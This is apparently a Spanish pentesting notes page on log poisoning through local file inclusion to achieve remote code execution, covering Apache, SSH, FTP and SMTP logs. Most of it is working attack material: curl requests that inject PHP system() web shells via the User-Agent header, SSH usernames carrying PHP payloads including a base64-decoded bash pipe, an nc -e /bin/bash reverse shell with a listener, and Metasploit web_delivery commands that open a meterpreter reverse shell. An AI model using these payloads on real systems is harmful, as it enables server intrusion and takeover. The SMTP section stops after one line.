Ataque de envenenamiento de logs (ficheros log del sistema) a los que se puede acceder vía LFI para conseguir RCE (Remote Code Execution).

Ataque sobre Apache:

> Archivo de logs de accesos de Apache --> `/var/log/apache2/access.log`
> Si hacemos una petición al servidor, esta será guardada en access.log
> Uso del user-agent para cargar un payload en el fichero de access.log del servidor --> `curl -s -H "User-Agent: <?php system('whoami'); ?>" "http://localhost/example.php?file=/var/log/apache2/access.log"`
> Recargamos la página con LFI al access.log y vemos la ejecución de comandos --> `http://localhost/example.php?file=/var/log/apache2/access.log`
> El código php se ha ejecutado en el sitema

Ataque sobre SSH:

> Fichero de log de autenticación por SSH --> `/var/log/auth.log`
> Acceso con usuario no existente --> `ssh loquesea@127.0.0.1`
> En auth.log veremos una conexión rechazada.
> Obtener reverse-shell:
> `echo "nc -e /bin/bash 127.0.0.1 443"`
> `ssh '<?php system("echo '<cadena_base64>' | base64 -d | bash"); ?>'@127.0.0.1`
> Poner puerto en escucha --> `nc -nlvp 443`
> Acceder al recurso auth.log mediante el LFI --> `http://localhost/example.php?file=/var/log/auth.log`
> Obtenemos una reverse-shell

================================================================

** FTP Log Poisoning **

Sistema vulnerable a LFI  
/var/log/vsftpd.log - Fichero donde se guardan los logs del servidor FTP  
  
Payload : 
`<?php system($_GET[‘commandInjection’]); ?>`
![[Pasted image 20210913145341.png]] 
`/var/log/vsftpd.log&commandInjection=ifconfig`
![[Pasted image 20210913145417.png]]

================================================================

** SSH Log Poisoning **

`http://192.168.1.129/lfi/lfi.php?file=/var/log/auth.log`
![[Pasted image 20210913145040.png]]
`ssh '<?php system($_GET['c']); ?>'@192.168.1.129`
![[Pasted image 20210913145126.png]]
`tail -f /var/log/auth.log`
![[Pasted image 20210913145158.png]]
`http://192.168.1.129/lfi/lfi.php?file=/var/log/auth.log&c=ifconfig`
![[Pasted image 20210913145253.png]]

================================================================

** SSH Log Poisoning con Metasploit **

``` Metasploit
use exploit/multi/script/web_delivery  
	msf exploit (web_delivery)>set target 1  
	msf exploit (web_delivery)> set payload php/meterpreter/reverse_tcp  
	msf exploit (web_delivery)> set lhost 192.168.1.123  
	msf exploit (web_delivery)>set srvport 8081  
	msf exploit (web_delivery)>exploit
```

![[Pasted image 20210913145705.png]]
![[Pasted image 20210913145733.png]]

``` Metasploit
msf exploit (web_delivery)>sessions 1  
meterpreter> sysinfo
```

![[Pasted image 20210913145847.png]]

================================================================

** Apache Log Poisoning **

`http://192.168.1.129/lfi/lfi.php?file=/var/log/apache2/access.log`
![[Pasted image 20210913151043.png]]
`<?php system($_GET['c']); ?>`
![[Pasted image 20210913151118.png]]
![[Pasted image 20210913151149.png]]
`http://192.168.1.129/lfi/lfi.php?file=/var/log/apache2/access.log&c=ifconfig`
![[Pasted image 20210913151239.png]]

================================================================

** SMTP Log Poisoning **

`/var/log/mail`
![[Pasted image 20210913151351.png]]